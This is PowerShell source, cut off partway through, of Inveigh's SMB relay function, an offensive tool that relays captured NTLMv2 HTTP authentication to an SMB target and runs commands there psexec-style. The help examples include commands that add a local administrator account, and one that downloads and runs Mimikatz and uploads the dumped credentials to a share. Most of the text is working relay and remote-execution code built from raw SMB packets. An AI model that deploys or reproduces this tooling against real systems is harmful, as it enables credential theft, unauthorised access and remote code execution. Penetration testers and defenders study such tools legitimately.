Function Invoke-InveighRelay
{
<#
.SYNOPSIS
Invoke-InveighRelay is the main Inveigh SMB relay function. Invoke-InveighRelay can be used either through Invoke-Inveigh or as a standalone function.

.DESCRIPTION
Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.

.PARAMETER HTTPSCertThumbprint
Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be inveigh.pfx.

.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.
Note that during SMB relay attempts, the challenge will be pulled from the SMB relay target. 

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.

.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.

.PARAMETER SMBRelayCommand
Command to execute on SMB relay target.

.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format. 

.PARAMETER SMBRelayAutoDisable
Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.

.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.
Note that you will not see the various yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must also be enabled.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  

.EXAMPLE
Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Winter2016 /add && net localgroup administrators Dave /add"
Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  

.EXAMPLE
Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "powershell \\192.168.2.50\temp$\powermeup.cmd"
Execute with SMB relay enabled and using Mubix's powermeup.cmd method of launching Invoke-Mimikatz.ps1 and uploading output. In this example, a hidden anonymous share containing Invoke-Mimikatz.ps1 is employed on the Inveigh host system. 
Powermeup.cmd contents used for this example:
powershell "IEX (New-Object Net.WebClient).DownloadString('\\192.168.2.50\temp$\Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > \\192.168.2.50\temp$\%COMPUTERNAME%.txt 2>&1"
Original version:
https://github.com/mubix/post-exploitation/blob/master/scripts/mass_mimikatz/powermeup.cmd

.LINK
https://github.com/Kevin-Robertson/Inveigh

#>

# Default parameter values can be modified in this section 
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTPS="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$FileOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$OutputStreamOnly="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$MachineAccounts="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][string]$WPADAuth="NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
    [parameter(Mandatory=$true)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="127.0.0.1",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
    [parameter(Mandatory=$false)][array]$SMBRelayUsernames="",
    [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
    [parameter(Mandatory=$true)][string]$SMBRelayCommand = "", 
    [parameter(Mandatory=$false)][string]$HTTPSCertThumbprint="76a49fd27011cf4311fb6914c904c90a89f3e4b2",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(!$SMBRelayTarget)
{
    Throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
}
elseif(!$SMBRelayCommand)
{
    Throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
}

if(!$OutputDir)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [hashtable]::Synchronized(@{})
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = @()
    $inveigh.SMBRelay_failed_list = @()
}

if($inveigh.relay_running)
{
    Throw "Invoke-InveighRelay is already running, use Stop-Inveigh"
}

if($inveigh.HTTP_listener.IsListening)
{
    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

if(!$inveigh.running)
{
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.status_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $inveigh.console_output = $false
    $inveigh.console_input = $true
    $inveigh.file_output = $false
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.challenge = $Challenge
}

$inveigh.relay_running = $true
$inveigh.SMB_relay_active_step = 0
$inveigh.SMB_relay = $true

if($StatusOutput -eq 'y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive Powershell
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

# Write startup messages
if(!$inveigh.running)
{
    $inveigh.status_queue.add("Inveigh Relay started at $(Get-Date -format 's')")|Out-Null
    $inveigh.log.add("$(Get-Date -format 's') - Inveigh started") |Out-Null

    if($HTTP -eq 'y')
    {
        $inveigh.HTTP = $true
        $inveigh.status_queue.add("HTTP Capture Enabled")|Out-Null
    }
    else
    {
        $inveigh.HTTP = $false
        $inveigh.status_queue.add("HTTP Capture Disabled")|Out-Null
    }

    if($HTTPS -eq 'y')
    {
        try
        {
            $inveigh.HTTPS = $true
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            $certificate.Import($PWD.Path + "\inveigh.pfx")
            $certificate_store.Add($certificate) 
            $certificate_store.Close()
            Invoke-Expression -command ("netsh http add sslcert ipport=0.0.0.0:443 certhash=" + $inveigh.certificate_thumbprint + " appid='{00112233-4455-6677-8899-AABBCCDDEEFF}'") > $null
            $inveigh.status_queue.add("HTTPS Capture Enabled")|Out-Null
        }
        catch
        {
            $certificate_store.Close()
            $HTTPS="N"
            $inveigh.HTTPS = $false
            $inveigh.status_queue.add("HTTPS Capture Disabled Due To Certificate Install Error")|Out-Null
        }
    }
    else
    {
        $inveigh.status_queue.add("HTTPS Capture Disabled")|Out-Null
    }

    if($Challenge)
    {
        $Inveigh.challenge = $challenge
        $inveigh.status_queue.add("NTLM Challenge = $Challenge")|Out-Null
    }

    if($MachineAccounts -eq 'n')
    {
        $inveigh.status_queue.add("Ignoring Machine Accounts")|Out-Null
    }

    $inveigh.status_queue.add("Force WPAD Authentication = $WPADAuth")|Out-Null

    if($ConsoleOutput -eq 'y')
    {
        $inveigh.status_queue.add("Real Time Console Output Enabled")|Out-Null
        $inveigh.console_output = $true
    }
    else
    {
        if($inveigh.tool -eq 1)
        {
            $inveigh.status_queue.add("Real Time Console Output Disabled Due To External Tool Selection")|Out-Null
        }
        else
        {
            $inveigh.status_queue.add("Real Time Console Output Disabled")|Out-Null
        }
    }

    if($FileOutput -eq 'y')
    {
        $inveigh.status_queue.add("Real Time File Output Enabled")|Out-Null
        $inveigh.status_queue.add("Output Directory = $output_directory")|Out-Null
        $inveigh.file_output = $true
    }
    else
    {
        $inveigh.status_queue.add("Real Time File Output Disabled")|Out-Null
    }
}

$inveigh.status_queue.add("SMB Relay Enabled") |Out-Null
$inveigh.status_queue.add("SMB Relay Target = $SMBRelayTarget")|Out-Null

if($SMBRelayUsernames)
{
    if($SMBRelayUsernames.Count -eq 1)
    {
        $inveigh.status_queue.add("SMB Relay Username = " + $SMBRelayUsernames -join ",")|Out-Null
    }
    else
    {
        $inveigh.status_queue.add("SMB Relay Usernames = " + $SMBRelayUsernames -join ",")|Out-Null
    }
}

if($SMBRelayAutoDisable -eq 'y')
{
    $inveigh.status_queue.add("SMB Relay Auto Disable Enabled")|Out-Null
}
else
{
    $inveigh.status_queue.add("SMB Relay Auto Disable Disabled")|Out-Null
}

if($SMBRelayNetworkTimeout)
{
    $inveigh.status_queue.add("SMB Relay Network Timeout = $SMBRelayNetworkTimeout Seconds")|Out-Null
}

if($ShowHelp -eq 'y')
{
    $inveigh.status_queue.add("Use Get-Command -Noun Inveigh* to show available functions")|Out-Null
    $inveigh.status_queue.add("Run Stop-Inveigh to stop Inveigh")|Out-Null
        
    if($inveigh.console_output)
    {
        $inveigh.status_queue.add("Press any key to stop real time console output")|Out-Null
    }
}

if($inveigh.status_output)
{
    while($inveigh.status_queue.Count -gt 0)
    {
        if($inveigh.output_stream_only)
        {
            write-output($inveigh.status_queue[0] + $inveigh.newline)
            $inveigh.status_queue.RemoveRange(0,1)
        }
        else
        {
            switch ($inveigh.status_queue[0])
            {
                "Run Stop-Inveigh to stop Inveigh"
                {
                    write-warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveRange(0,1)
                }
            }
        }
    }
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
$process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | FOREACH{[CHAR][CONVERT]::toint16($_,16)}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{
    Function DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [BitConverter]::ToUInt16($field,0)
    }

    Function DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [BitConverter]::ToUInt32($field,0)
    }

    Function DataLength
    {
        param ([int]$length_start,[byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    Function DataToString
    {
        param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }
}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }
}

# SMB Relay Challenge ScriptBlock - gathers NTLM server challenge from relay target
$SMB_relay_challenge_scriptblock =
{
    Function SMBRelayChallenge
    {
        param ($SMB_relay_socket,$HTTP_request_bytes)

        if ($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_challenge_bytes = New-Object System.Byte[] 1024

        $i = 0
        
        :SMB_relay_challenge_loop while ($i -lt 2)
        {
            switch ($i)
            {
                0 {
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $inveigh.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00)
                }
                
                1 { 
                    $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 32)
                    $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 22)
                    $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 2)
                    $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length)
                    $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
                    $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
                    $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 11))
                    $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
                    $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 70))
                    $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    [array]::Reverse($SMB_netbios_length)
                    
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
                        + $SMB_netbios_length`
                        + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $inveigh.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_blob_length`
                        + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                        + $SMB_byte_count`
                        + $HTTP_request_bytes`
                        + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
                }
            }

            $SMB_relay_challenge_stream.Write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
            $SMB_relay_challenge_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_challenge_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_challenge_stopwatch = [diagnostics.stopwatch]::StartNew()
                
                while(!$SMB_relay_challenge_stream.DataAvailable)
                {
                    if($SMB_relay_challenge_stopwatch.elapsed -ge $SMB_relay_challenge_timeout)
                    {
                        $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break SMB_relay_challenge_loop
                    }
                }
            }
    
            $SMB_relay_challenge_stream.Read($SMB_relay_challenge_bytes, 0, $SMB_relay_challenge_bytes.length)

            $i++
        }
        
        return $SMB_relay_challenge_bytes
    }
}

# SMB Relay Response ScriptBlock - sends NTLM reponse to relay target
$SMB_relay_response_scriptblock =
{
    Function SMBRelayResponse
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_user_ID)
    
        $SMB_relay_response_bytes = New-Object System.Byte[] 1024

        if ($SMB_relay_socket)
        {
            $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 244)
        $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 248)
        $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 252)
        $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length - 256)
        $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 16))
        $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
        $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 27))
        $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
        $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 86))
        $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
        $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [array]::Reverse($SMB_netbios_length)
        
        $j = 0
        
        :SMB_relay_response_loop while ($j -lt 1)
        {
            [Byte[]] $SMB_relay_response_send = (0x00,0x00)`
                + $SMB_netbios_length`
                + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                + $inveigh.process_ID_bytes`
                + $SMB_user_ID`
                + (0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                + $SMB_blob_length`
                + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                + $SMB_byte_count`
                + (0xa1,0x82,0x01)`
                + $SMB_length_1`
                + (0x30,0x82,0x01)`
                + $SMB_length_2`
                + (0xa2,0x82,0x01)`
                + $SMB_length_3`
                + (0x04,0x82,0x01)`
                + $SMB_NTLMSSP_length`
                + $HTTP_request_bytes`
                + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
            
            $SMB_relay_response_stream.write($SMB_relay_response_send, 0, $SMB_relay_response_send.length)
        	$SMB_relay_response_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_response_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_response_stopwatch = [diagnostics.stopwatch]::StartNew()
                    
                while(!$SMB_relay_response_stream.DataAvailable)
                {
                    if($SMB_relay_response_stopwatch.elapsed -ge $SMB_relay_response_timeout)
                    {
                        $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break :SMB_relay_response_loop
                    }
                }
            }

            $SMB_relay_response_stream.Read($SMB_relay_response_bytes, 0, $SMB_relay_response_bytes.length)
            
            $inveigh.SMB_relay_active_step = 2
            
            $j++
        
        }
        return $SMB_relay_response_bytes
    }
}

# SMB Relay Execute ScriptBlock - executes command within authenticated SMB session
$SMB_relay_execute_scriptblock =
{
    Function SMBRelayExecute
    {
        param ($SMB_relay_socket,$SMB_user_ID)
    
        if ($SMB_relay_socket)
        {
            $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
        }

        $SMB_relay_failed = $false
        $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
        $SMB_service_random = [String]::Join("00-", (1..20 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
        $SMB_service = $SMB_service_random -replace "-00",""
        $SMB_service = $SMB_service.Substring(0,$SMB_service.Length-1)
        $SMB_service = $SMB_service.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
        $SMB_service_random += '00-00-00'
        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_referent_ID_bytes = [String](1..4 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
        [System.Text.Encoding]::ASCII.GetBytes($SMBRelayCommand) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }

        if([bool]($SMBRelayCommand.length%2))
        {
            $SMB_relay_command += '00-00'
        }
        else
        {
            $SMB_relay_command += '00-00-00-00'
        }    
        
        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237)
        $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
        $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237 - 63)
        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]   
        $SMB_relay_command_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length / 2)

        $k = 0

        :SMB_relay_execute_loop while ($k -lt 12)
        {
            switch ($k)
            {
            
                0 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31)`
                        + (0x30,0x2e,0x32,0x2e,0x31,0x30,0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00)
                }
                  
                1 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,0x18,0x02,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00)
                }
                
                2 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00)`
                        + (0x00,0x00,0x48,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + (0x01,0x00,0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03,0x02,0x00,0x00)`
                        + (0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x05)
                }
               
                3 { 
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                4 {
                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x50)`
                        + (0x00,0x00,0x00,0x5c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
                        + (0x00,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00)
                        
                        $SMB_multiplex_id = (0x07)
                }
                
                5 {  
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                6 {
                    [Byte[]]$SMB_relay_execute_send = [ARRAY](0x00)`
                        + $SMB_service_data_length_bytes`
                        + (0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x3f,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x05,0x00,0x00,0x03,0x10)`
                        + (0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00)`
                        + $SMB_context_handler`
                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00)`
                        + $SMB_referent_ID_bytes`
